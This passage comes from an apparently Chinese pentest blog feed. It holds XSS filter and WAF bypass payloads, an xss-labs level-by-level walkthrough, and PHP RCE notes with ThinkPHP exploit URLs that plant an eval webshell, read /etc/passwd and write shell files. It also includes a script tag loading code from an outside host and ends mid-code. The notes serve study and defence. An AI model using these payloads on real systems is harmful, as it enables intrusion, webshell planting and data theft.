title="垃圾数据溢出"></a>垃圾数据溢出</h3><p>在脚本末尾加上大量无关字符，导致过滤条件失效。注意最后要加上#注释、或者&#x2F;&#x2F;、或者–+，需要自己试（特殊符号干扰）。</p><p>比如<code>&lt;script src=&#39;https://xxs8.cc/xxxx&#39;fhdhbgdioslbdvs#&gt;</code></p><h3 id="编码转换（编码绕过）"><a href="#编码转换（编码绕过）" class="headerlink" title="编码转换（编码绕过）"></a>编码转换（编码绕过）</h3><p>对输入到页面的数据进行编码转换，使得攻击语句的某些特殊字符被编码，攻击失效。</p><p>绕过时，对攻击语句也主动进行编码即可，网站发现这些字符已经被编码，会自动对某些编码进行解码。。</p><p>包括JS编码，HTML实体编码，URL编码。</p><ul><li><p>JS编码</p><p>JS提供了四种编码策略：</p><p>三个八进制数字，如果个数不够，在前面补0，比如”e”的编码为”\145”；</p><p>两个十六进制数字，如果个数不够，在前面补0，比如”e”的编码为”\x65”；</p><p>四个十六进制数字，如果个数不够，在前面补0，比如”e”的编码为”\u005”；</p><p>对于一些控制字符，使用特殊的C类型的转义风格。</p></li><li><p>HTML实体编码</p><p>命名实体：以&amp;开头，以分号结尾，例如<code>&lt;</code>的编码是<code>&amp;lt;</code>。</p><p>字符编码：十进制、十六进制ASCII码或Unicode字符编码，样式为<code>&amp;#数值;</code>，例如<code>&lt;</code>的编码是<code>&amp;#060;</code>和<code>&amp;#x3c;</code>。</p></li><li><p>URL编码</p><p>由于网页会对URL进行一次解码，所以使用URL编码绕过时有时需要进行两次编码。所以在使用编码测试时，需要考虑HTML的渲染顺序，选择合适的编码方式进行测试。</p></li></ul><p>针对不同的WAF产品，有不同的编码绕过方法：<a href="https://bbs.pediy.com/thread-250852.htm">https://bbs.pediy.com/thread-250852.htm</a></p><p>针对Cloudflare，使用无空格filler绕过：<code>&lt;a&quot;/onclick=(confirm)()&gt;click\</code></p><p>针对Worldfence，使用数字符编码绕过：<code>&lt;a/href=javascript&amp;colon;alert()&gt;click\</code></p><p>针对Barracuda，使用数字符编码绕过：<code>&lt;a/href=&amp;#74;ava%0a%ed%09script&amp;colon;alert()&gt;click\</code></p><p>针对Akamai，使用黑名单中缺少的event handler;混淆函数调用：<code>&lt;d3v/onauxclick-[2]. some(conf irm)&gt;click\</code></p><h3 id="内置函数转义（难绕过）"><a href="#内置函数转义（难绕过）" class="headerlink" title="内置函数转义（难绕过）"></a>内置函数转义（难绕过）</h3><p>使用 <code>htmlspecialchars</code> 函数对提交的信息进行 <strong>转义</strong>。该函数会将所有特殊字符转义为 HTML 实体。比如把 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，把 <code>&gt;</code> 转义为 <code>&amp;gt;</code>。只要正确的使用该函数，XSS 攻击就可以彻底杜绝。</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p><a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></p><p>xss-labs通关大合集：</p><p><a href="https://blog.csdn.net/wo41ge/article/details/107459332%E3%80%81">https://blog.csdn.net/wo41ge/article/details/107459332、</a></p><p><a href="https://blog.csdn.net/m0_62879498/article/details/123592092">https://blog.csdn.net/m0_62879498/article/details/123592092</a></p><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>所输入name的值会回显在<code>&lt;h2&gt;&lt;/h2&gt;</code>中，因此直接插入script：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上述语句是标准模板，后面的关卡均可以先输入上述内容，来判断所使用的防御手段。</p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>在<code>&lt;h2&gt;&lt;/h2&gt;</code>中的内容被实体编码了，但在Input中没有：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;ccb&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因此在value中插入script，但是注意<code>&quot;&gt;</code>闭合以及注释。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>//</span><br><span class="line"></span><br><span class="line">// 效果如下</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>//&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>在<code>&lt;h2&gt;&lt;/h2&gt;</code>以及<code>&lt;input&gt;</code>中的内容均被实体编码，无法使用&lt;&gt;。</p><p>因此，使用<code>&lt;input&gt;</code>的特殊事件来触发script，input的&lt;&gt;可以不闭合。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&#x27; onfocus=javascript:alert(1)//</span><br><span class="line"></span><br><span class="line">// 效果如下</span><br><span class="line">&lt;input name=keyword  value=&#x27;&#x27; onfocus=javascript:alert(1)//&#x27;&gt;</span><br></pre></td></tr></table></figure><p>输入后，再点击输入框即可出发onfocus事件。</p><h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p>第三关的单引号闭合换为双引号。</p><h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><p>经过尝试，发现script、onfocus、οnmοuseοver 均被注释掉了。使用<code>&lt;a&gt;</code>标签。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&quot;&gt;&lt;a href=javascript:alert(1)&gt;ccb&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// 使用效果如下，页面会增加一个显示为ccb的超链接，点击即可触发js代码</span><br><span class="line">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=javascript:alert(1)&gt;ccb&lt;/a&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p>经过尝试，发现script和href均被过滤。使用大小写绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&quot;&gt;&lt;a Href=javascript:alert(1)&gt;ccb&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// 使用效果如下，页面会增加一个显示为ccb的超链接，点击即可触发js代码</span><br><span class="line">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a Href=javascript:alert(1)&gt;ccb&lt;/a&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p><code>&lt;input&gt;</code>的value值未被实体编码，但是若提交的内容中有script、href会被替换为空。双写绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&quot;&gt;&lt;a hrhrefef=javascrscriptipt:alert(1)&gt;ccb&lt;/a&gt;</span><br></pre></td></tr></table></figure><h3 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h3><p>引号、&lt;、&gt;均被实体编码，href、script又被过滤，只能使用编码绕过。</p><p>将<code>javascript:alert(1)</code>中的script转化为实体编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</span><br></pre></td></tr></table></figure><h3 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h3><p>在第8关的基础上，强制输入的内容要带有<code>http://</code>，不然报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(`http://`)</span><br></pre></td></tr></table></figure><h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p>页面上没有输入框，检查源码发现有三个<code>&lt;input&gt;</code>，尝试输入发现只有t_sort会回显。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?keyword=1&amp;t_sort=ccb</span><br><span class="line"></span><br><span class="line">?keyword=1&amp;t_sort=&quot; type=&quot;&quot; onclick= alert(`xss`)&gt;//</span><br><span class="line"></span><br><span class="line">// 效果如下</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>= <span class="string">alert(</span>`<span class="attr">xss</span>`)&gt;</span>//&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure><p>输入后，再点击页面即可触发onclick事件。</p><h3 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h3><p>与第10关的区别是双引号、&lt;&gt;被实体编码了。</p><p>但是可以看到多了一个名为t_ref的input标签，该标签的值也无法通过get方法赋予。但是根据名称，猜测来自referer。抓包，修改referer，发现响应体中的t_ref确实与请求头的referer字段的值相同。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20230917213236492.png" alt="image-20230917213236492" style="zoom:50%;"><p>使用BP或者hackbar提交referer即可。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">referer:&quot; type=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;//</span><br><span class="line"></span><br><span class="line">// 效果如下</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_ref&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>//&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20230917215234200.png" alt="image-20230917215234200"></p><h3 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h3><p>与第11关原理相同，只不过回显的字段从Referer换成了User-Agent。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:&quot; type=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;//</span><br></pre></td></tr></table></figure><h3 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h3><p>与第11关原理相同，只不过回显的字段从Referer换成了Cookie。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user=&quot; type=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;//</span><br></pre></td></tr></table></figure><h3 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h3><p><a href="https://blog.csdn.net/qq_40929683/article/details/120422266">https://blog.csdn.net/qq_40929683/article/details/120422266</a></p><h3 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h3><p>传入src参数的值会被用于<code>ng-include</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?src=ccb</span><br><span class="line"></span><br><span class="line">// 查看页面html</span><br><span class="line">&lt;span class=&quot;ng-include:ccb&quot;&gt;&lt;/span&gt;</span><br></pre></td></tr></table></figure><p><code>ng-include</code>指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。</p><blockquote><p>ng-include如果单纯指定地址，必须要加引号</p><p>ng-include加载外部html，script标签中的内容不执行</p><p>ng-include加载外部html中含有style标签样式可以识别</p><p>ng-include 属性的值可以是一个表达式，返回一个文件名</p><p>默认情况下，包含的文件需要包含在同一个域名下。</p></blockquote><p>尝试通用的攻击语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&quot;&lt;script&gt;alert(1)&lt;/script&gt;  // </span><br></pre></td></tr></table></figure><p>发现双引号被过滤，&lt;&gt;被实体编码，只能使用其他XSS语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 加载同一域名下的外部文件level1.php，同时传入参数name</span><br><span class="line">?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27;</span><br></pre></td></tr></table></figure><p>这样该页面就会包含level1.php，并传入name参数<code>&lt;img src=1 onerror=alert(1)&gt;&#39;</code>，由于在解析src时出错，所以触发onerror。</p><h3 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h3><p>尝试如下语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">?keyword=&lt;img src=1 οnerrοr=alert(&#x27;xss&#x27;) &gt;</span><br></pre></td></tr></table></figure><p>发现script被注释，空格和&#x2F;均被转义。</p><p>尝试使用%0A替换空格：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;img%0asrc=1%0aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><h3 id="level-17-20"><a href="#level-17-20" class="headerlink" title="level 17-20"></a>level 17-20</h3><p>flash XSS，与swf文件相关。</p><p><a href="https://blog.csdn.net/qq_40929683/article/details/120422266">https://blog.csdn.net/qq_40929683/article/details/120422266</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XSS&quot;&gt;&lt;a href=&quot;#XSS&quot; class=&quot;headerlink&quot; title=&quot;XSS&quot;&gt;&lt;/a&gt;XSS&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2021/png/2476579/162813291</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>RCE代码及命令执行</title>
    <link href="https://frankcao3.github.io/posts/2282"/>
    <id>https://frankcao3.github.io/posts/2282</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.979Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RCE-代码及命令执行漏洞"><a href="#RCE-代码及命令执行漏洞" class="headerlink" title="RCE 代码及命令执行漏洞"></a>RCE 代码及命令执行漏洞</h1><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1628823541359-475e91f5-4f42-44a6-b59c-7b35fcb644ac.png" alt="RCE.png"></p><p><strong>remote command&#x2F;code execute</strong> 分为<strong>远程命令执行</strong>和<strong>远程代码执行</strong>。</p><p>在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用<u>代码或命令执行函数</u>去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。</p><h2 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>应用有时需要调用一些执行系统命令的函数，如PHP中的<strong>system</strong>、<strong>exec</strong>、<strong>assert</strong>、<strong>eval</strong>、<strong>preg_replace</strong>、<strong>shell_exec</strong>、<strong>passthru</strong>、<strong>popen</strong>、<strong>proc_popen</strong>、<strong>escapeshellcmd</strong>、<strong>pcntl_exec</strong>、<strong>call_user_func</strong>、<strong>call_user_func_array</strong>、<strong>array_map</strong>、<strong>动态函数</strong> 等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行，这就是命令执行漏洞。</p><p>以上函数主要也在webshell中用的多，实际上在正常应用中差别不太大，用得最多的还是前三个。</p><h3 id="产生"><a href="#产生" class="headerlink" title="产生"></a>产生</h3><p><strong>web源码</strong>：thinkphp、eyoucms、wordpress</p><p><strong>中间件平台</strong>：tomcat、struts2、redis</p><p><strong>其他平台</strong>：php-cgi、jenkins-cl、java-RMI</p><p>可以进一步参考vulhub中的漏洞。</p><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul><li>执行任意代码</li><li>向网站写WebShell</li><li>控制整个网站甚至服务器</li></ul><p>例如获取服务器网络配置、php版本信息：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804103952499.png" alt="image-20220804103952499"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804104032041.png" alt="image-20220804104032041"></p><h3 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h3><h4 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h4><p>eval() 函数<strong>把字符串按照 PHP 代码来计算</strong>。该字符串必须是合法的 PHP 代码，且必须以分号结尾。如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p><p>在服务器上创建一下代码test.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>，</span><br><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>] ; </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查看文件：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804103612237.png" alt="image-20220804103612237"></p><p>查看管理员：</p><p><img src="https://i0.hdslb.com/bfs/article/1809d2c695ee31ad7df983396c96fe9f2e56fb5a.png@831w_98h_progressive.webp" alt="img"></p><p>添加管理员：</p><p><img src="https://i0.hdslb.com/bfs/article/42c39426697b4bf2945f925da0de0748f9bc0fce.png@696w_65h_progressive.webp" alt="img"></p><h4 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 支持动态调用，但是在php7.0.29之后的版本不支持动态调用</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">?</span><br></pre></td></tr></table></figure><h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>此函数的作用是对一个字符串进行正则处理。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> $ pattern , <span class="keyword">mixed</span> $ replacement , <span class="keyword">mixed</span> $ subject [, <span class="keyword">int</span> $ limit = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;$ count ]] )</span><br></pre></td></tr></table></figure><h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h4><p>把第一参数作为回调函数</p><h4 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h4><p>调用回到函数，并把第一个数组参数作为回到函数的参数</p><h4 id="array-map"><a href="#array-map" class="headerlink" title="array_ map()"></a>array_ map()</h4><p>为数组的每个元素应用回调函数</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>一般找CMS相应版本漏洞，如<strong>ThinkPHP2.1</strong></p><ul><li><p>一句话木马</p><p>给语句加上了${}，令其为变量，可作为动态函数执行。</p><p><code>http://www.xxx.com/News/detail/id/&#123;$&#123;@eval($_POST[aa])&#125;&#125;</code></p></li><li><p>得到当前路径<br><code>http://www.xxx.com/News/detail/id/&#123;$&#123;print(getcwd()))&#125;&#125;</code></p></li><li><p>读文件<br><code>http://www.xxx.com/News/detail/id/&#123;$&#123;exit(var_dump(file_get_contents($_POST[&#39;f&#39;])))&#125;&#125;</code><br>POST的数据为：<code>f=/etc/passwd</code></p></li><li><p>写shell<br><code>http://www.xxx.com/News/detail/id/&#123;$&#123;exit(var_dump(file_put_contents($_POST[&#39;f&#39;],$_POST[d])))&#125;&#125;</code><br>POST的数据为：<code>f=1.php&amp;d=&lt;?php @eval($_POST[&#39;aa&#39;])?&gt;</code></p></li></ul><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul><li><p>少用或禁用命令执行函数</p><p>尽量<strong>少用</strong>执行命令的函数或者直接<strong>禁用</strong>。能使用脚本解决的工作，不要调用其他程序处理。尽量少用执行命令的函数，并在<strong>disable_functions</strong>中禁用</p></li><li><p>确保动态执行的函数为指定的函数</p><p>在使用动态函数之前，确保使用的函数是<strong>指定的函数</strong>之一</p></li><li><p>参数用引号括起，且进行过滤或固定</p><p>在进入执行命令的函数&#x2F;方法之前，<strong>对参数进行过滤，对敏感字符进行转义</strong>。参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义。</p><p>对于可控点是程序参数的情况下，使用escapeshellcmd函数进行过滤，对于可控点是程序参数值的情况下，使用escapeshellarg函数进行过滤</p></li></ul><p>而针对由特定第三方组件引发的漏洞，我们要做的就是及时打补丁，修改安装时的默认配置。</p><p>对于eval( )函数一定要保证用户不能轻易接触eval的参数或者用正则严格判断输入的数据格式。</p><p><strong>对于preg_replace放弃使用&#x2F;e修饰符</strong>。如果必须要用e修饰符，请保证第二个参数中，对于正则匹配出的对象，用单引号包裹 。</p><h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>用户通过浏览器提交操作系统执行命令，由于服务器端 <strong>没有针对执行函数做过滤</strong>，导致在没有指定绝对路径的情况下就执行命令，可能会允许使用者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</p><p>在操作系统中，<code>&amp;</code>、<code>|</code>、<code>||</code>都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。（<code>||</code>只要满足第一个条件，后面的条件就不再判断，而<code>|</code>要对所有的条件进行判断）</p><p><strong>Windows系统命令拼接：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">“|”：管道符，前面命令标准输出作为后面命令的标准输入。</span><br><span class="line">“&amp;” commandA &amp; commandB 先运行命令A，然后运行命令B</span><br><span class="line">“||” commandA || commandB 运行命令A，如果失败则运行命令B</span><br><span class="line">“&amp;&amp;” commandA &amp;&amp; commandB 运行命令A，如果成功则运行命令B</span><br></pre></td></tr></table></figure><p>例题：<a href="https://blog.csdn.net/m0_62851980/article/details/124166126">https://blog.csdn.net/m0_62851980/article/details/124166126</a></p><h3 id="产生-1"><a href="#产生-1" class="headerlink" title="产生"></a>产生</h3><p><strong>web源码</strong>：Nexus、Webmin、ElasticSearch</p><p><strong>中间件平台</strong>：Weblogic、Apache、Postgresql</p><p><strong>其他环境</strong>：Samba、Supervisord</p><h3 id="函数介绍-1"><a href="#函数介绍-1" class="headerlink" title="函数介绍"></a>函数介绍</h3><h4 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h4><p>system函数可以用来执行一个外部的应用程序并将相应的执行结果输出，函数原型如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(command, return_var)</span><br></pre></td></tr></table></figure><p>其中，command是要执行的命令，return_var存放执行命令的执行后的状态值。</p><h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>exec函数可以用来执行一个外部的应用程序。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span> (command, output, return_var)</span><br></pre></td></tr></table></figure><p>其中，command是要执行的命令，output是获得执行命令输出的每一行字符串，return_var存放执行命令后的状态值</p><h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h4><p>passthru函数可以用来执行一个UNIX系统命令并显示原始的输出。</p><p>当UNIX系统命令的输出是二进制的数据，并且需要直接返回值给浏览器时，需要使用passthru函数来替代system与exec函数。</p><p>Passthru函数原型如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">passthru</span> (command, return_var)</span><br></pre></td></tr></table></figure><p>其中，command是要执行的命令，return_var存放执行命令后的状态值。</p><h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h4><p>执行shell命令并返回输出的字符串，函数原型如下：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">shell_exec</span>(command)</span><br></pre></td></tr></table></figure><p>其中，command是要执行的命令。</p><h4 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h4><p>不返回执行结果，而是返回一个文件指针。</p><h4 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h4><h4 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h4><p>在当前进程空间执行指定程序</p><h4 id="echo"><a href="#echo" class="headerlink" title="echo()"></a>echo()</h4><p>若php代码中，<strong>echo后跟的是反引号括起的内容，则会将该内容作为代码执行并输出结果</strong>，实际调用的将是Shell_exec()。</p><p><a href="https://blog.csdn.net/qq_37348714/article/details/108859203">https://blog.csdn.net/qq_37348714/article/details/108859203</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/20200928223911994.png" alt="在这里插入图片描述"></p><p>以墨者学院PHP代码分析溯源（第4题）为例：</p><p>有一网站，已知其php源码内容如下。由于存在解码和压缩函数，因此在在线运行中跑一下得到执行结果，其中echo的内容就是反引号括起的，所以会存在代码执行：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804161324103.png" alt="image-20220804161324103"></p><p>然后进一步使用参数a来进行命令执行：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804161658527.png" alt="image-20220804161658527"></p><p>看到该网站下有一个key开头的php文件，查看该文件内容（注意使用tac绕过对cat命令的过滤）：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804161852678.png" alt="image-20220804161852678"></p><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><ul><li><p>尽量不要使用命令执行函数</p></li><li><p>客户端提交的变量在进入执行命令函数方法之前，一定要做好过滤，对敏感字符进行转义</p></li><li><p>在使用动态函数之前，确保使用的函数是指定的函数之一</p></li><li><p>对PHP语言来说，不能完全控制的危险函数最好不要使用</p></li></ul><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>绕过对空格的检查：</p><p>比如<code>cat flag.txt</code>，要替换掉空格，且保持仍可执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 